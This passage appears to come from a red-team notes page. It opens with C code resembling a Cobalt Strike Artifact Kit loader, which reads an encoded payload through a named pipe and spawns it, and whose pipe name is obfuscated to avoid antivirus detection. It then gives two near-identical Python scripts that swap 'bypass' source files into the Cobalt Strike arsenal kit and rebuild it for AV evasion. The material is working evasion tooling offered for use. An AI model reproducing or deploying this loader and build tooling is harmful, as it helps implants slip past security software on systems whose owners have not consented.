   DWORD  read = 0;
#if USE_SYSCALLS == 1
   HANDLE pipe = create_named_pipe_file(pipename);
#else
   HANDLE pipe = CreateFileA(pipename, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
#endif
   if (pipe == INVALID_HANDLE_VALUE)
      return FALSE;

   /* read the encoded payload from the pipe */
   while (length > 0) {
#if USE_SYSCALLS == 1
      BOOL result = read_file(pipe, buffer, length, &read);
#else
      BOOL result = ReadFile(pipe, buffer, length, &read, NULL);
#endif
      if (!result)
         break;

      buffer += read;
      length -= read;
   }

#if USE_SYSCALLS == 1
   NtClose(pipe);
#else
   CloseHandle(pipe);
#endif
   return TRUE;
}

DWORD server_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* setup a pipe for our payload */
   server(payload->payload, payload->length);

   return 0;
}

DWORD client_thread(LPVOID whatever) {
   phear * payload = (phear *)data;

   /* allocate data for our "cleaned" payload */
   char * buffer = (char *)malloc(payload->length);

   /* try to connect to the pipe */
   do {
      Sleep(1024);
   }
   while (!client(buffer, payload->length));

   /* spawn our payload */
   spawn(buffer, payload->length, payload->key);

   /* clean up after ourselves */
   free(buffer);

   return 0;
}

void start(HINSTANCE mhandle) {
   /* switched from snprintf... as some A/V product was flagging based on the function *sigh* 
      92, 92, 46, 92, 112, 105, 112, 101, 92 is \\.\pipe\
   
   */
   sprintf(pipename, "%c%c%c%c%c%c%c%c%cnotrt-svc\\noptev", 92, 92, 46, 92, 112, 105, 112, 101, 92);

   /* start our server and our client */
#if USE_SYSCALLS == 1
   HANDLE thandle;
   NtCreateThreadEx(&thandle, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), &server_thread, NULL, 0, 0, 0, 0, NULL);
#else
   CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&server_thread, (LPVOID) NULL, 0, NULL);
#endif

   client_thread(NULL);
}              
```

spider moving
```python
import os
import shutil
import time
import subprocess
import threading
import itertools
import sys
import random

# === CONFIGURATION ===
src_common_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common"
originals_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals"
bypass_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions"
backup_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/backups"
build_script_dir = "/opt/cobaltstrike/arsenal-kit"
build_script = os.path.join(build_script_dir, "build_arsenal_kit.sh")

files_to_swap = ["patch.c", "bypass-pipe.c"]

# === HELPERS ===
def ensure_backup_dir():
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def backup_files():
    ensure_backup_dir()
    ts = timestamp()
    for filename in files_to_swap:
        src = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            dst = os.path.join(backup_dir, f"{filename}.{ts}.bak")
            shutil.copy2(src, dst)
            print(f"📦 Backed up {filename} → {dst}")
        else:
            print(f"⚠ {filename} not found in {src_common_dir}, skipping backup.")

def switch_files(source_dir):
    print(f"\n🔁 Swapping files from: {source_dir}")
    backup_files()
    for filename in files_to_swap:
        src = os.path.join(source_dir, filename)
        dst = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            shutil.copy2(src, dst)
            print(f"✅ Replaced {filename}")
        else:
            print(f"❌ {filename} not found in {source_dir}, skipping.")

# === Spider Animation ===
def spider_loader(stop_event):
    spider_frames = ["🕷️", "🕸️", "🕷️", "🕷️"]
    width = 50
    height = 20
    try:
        while not stop_event.is_set():
            x = random.randint(1, width)
            y = random.randint(1, height)
            frame = random.choice(spider_frames)
            sys.stdout.write(f"\033[{y};{x}H{frame} Building Arsenal Kit...")
            sys.stdout.flush()
            time.sleep(0.15)
    finally:
        sys.stdout.write("\033[0;0H✅ Arsenal Kit rebuilt successfully.\n")
        sys.stdout.flush()

def rebuild_artifact_kit():
    stop_event = threading.Event()
    thread = threading.Thread(target=spider_loader, args=(stop_event,))
    thread.start()

    try:
        subprocess.run(["bash", "build_arsenal_kit.sh"], cwd=build_script_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError as e:
        stop_event.set()
        thread.join()
        print(f"\n❌ Build failed: {e}")
        return
    except FileNotFoundError:
        stop_event.set()
        thread.join()
        print(f"\n❌ Could not find build script at: {build_script}")
        return

    stop_event.set()
    thread.join()

# === Menu ===
def show_menu():
    print("\n==== Artifact Kit Patch Switcher ====")
    print("1. Use ORIGINAL files (no AV bypass)")
    print("2. Use BYPASS files (AV evasion)")
    print("3. Exit")

def main():
    while True:
        show_menu()
        choice = input("Choose an option (1-3): ").strip()
        if choice == "1":
            switch_files(originals_dir)
            rebuild_artifact_kit()
        elif choice == "2":
            switch_files(bypass_dir)
            rebuild_artifact_kit()
        elif choice == "3":
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()

```

7
```python
import os
import shutil
import time
import subprocess
import threading
import itertools
import sys
import random

# === CONFIGURATION ===
src_common_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/src-common"
originals_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/originals"
bypass_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/bypass_versions"
backup_dir = "/opt/cobaltstrike/arsenal-kit/kits/artifact/artifact-kit-AV-switcher/backups"
build_script_dir = "/opt/cobaltstrike/arsenal-kit"
build_script = os.path.join(build_script_dir, "build_arsenal_kit.sh")

files_to_swap = ["patch.c", "bypass-pipe.c"]

# === HELPERS ===
def ensure_backup_dir():
    if not os.path.exists(backup_dir):
        os.makedirs(backup_dir)

def timestamp():
    return time.strftime("%Y%m%d-%H%M%S")

def backup_files():
    ensure_backup_dir()
    ts = timestamp()
    for filename in files_to_swap:
        src = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            dst = os.path.join(backup_dir, f"{filename}.{ts}.bak")
            shutil.copy2(src, dst)
            print(f"📦 Backed up {filename} → {dst}")
        else:
            print(f"⚠ {filename} not found in {src_common_dir}, skipping backup.")

def switch_files(source_dir):
    print(f"\n🔁 Swapping files from: {source_dir}")
    backup_files()
    for filename in files_to_swap:
        src = os.path.join(source_dir, filename)
        dst = os.path.join(src_common_dir, filename)
        if os.path.exists(src):
            shutil.copy2(src, dst)
            print(f"✅ Replaced {filename}")
        else:
            print(f"❌ {filename} not found in {source_dir}, skipping.")

# === Spider Animation ===
def spider_loader(stop_event):
    width = 40  # max horizontal travel distance
    direction = 1
    pos = 0
    spider_frames = ["🕷️", "🕸️", "🕷️", "🕷️"]
    
    while not stop_event.is_set():
        frame = random.choice(spider_frames)
        pos += direction * random.randint(1, 3)
        if pos >= width:
            pos = width
            direction = -1
        elif pos <= 0:
            pos = 0
            direction = 1

        padding = " " * pos
        sys.stdout.write(f"\r{padding}{frame} Building Arsenal Kit...   ")
        sys.stdout.flush()
        time.sleep(0.1)

    sys.stdout.write("\r✅ Arsenal Kit rebuilt successfully.          \n")

def rebuild_artifact_kit():
    stop_event = threading.Event()
    thread = threading.Thread(target=spider_loader, args=(stop_event,))
    thread.start()

    try:
        subprocess.run(["bash", "build_arsenal_kit.sh"], cwd=build_script_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
    except subprocess.CalledProcessError as e:
        stop_event.set()
        thread.join()
        print(f"\n❌ Build failed: {e}")
        return
    except FileNotFoundError:
        stop_event.set()
        thread.join()
        print(f"\n❌ Could not find build script at: {build_script}")
        return

    stop_event.set()
    thread.join()

# === Menu ===
def show_menu():
    print("\n==== Artifact Kit Patch Switcher ====")
    print("1. Use ORIGINAL files (no AV bypass)")
    print("2. Use BYPASS files (AV evasion)")
    print("3. Exit")

def main():
    while True:
        show_menu()
        choice = input("Choose an option (1-3): ").strip()
        if choice == "1":
            switch_files(originals_dir)
            rebuild_artifact_kit()
        elif choice == "2":
            switch_files(bypass_dir)
            rebuild_artifact_kit()
        elif choice == "3":
            print("👋 Exiting...")
            break
        else:
            print("❌ Invalid choice. Try again.")

if __name__ == "__main__":
    main()

```